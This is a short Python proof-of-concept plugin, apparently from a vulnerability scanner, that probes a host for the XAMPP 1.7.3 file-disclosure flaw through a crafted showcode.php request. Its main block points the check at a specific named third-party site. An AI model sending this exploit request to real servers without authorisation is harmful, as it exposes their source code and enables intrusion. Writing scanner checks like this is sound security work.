from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name   :   XAMPP <= 1.7.3 File disclosure vulnerability
#Reference  :   http://www.exploit-db.com/exploits/15370/

import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg + "xampp/showcode.php/showcode.php?showcode=1"
        code, head, res, errcode,finalurl =  curl.curl(url)
        if res.find('file_get_contents') != -1 :
            output('Verify url: ' + url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  XAMPP  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='disclosure Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/component/XAMPP/www_0513e4ffc8bbb2129805b3ac0e9545ea.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_0513e4ffc8bbb2129805b3ac0e9545ea.py
#/root/github/poccreate/codesrc/exp-319.py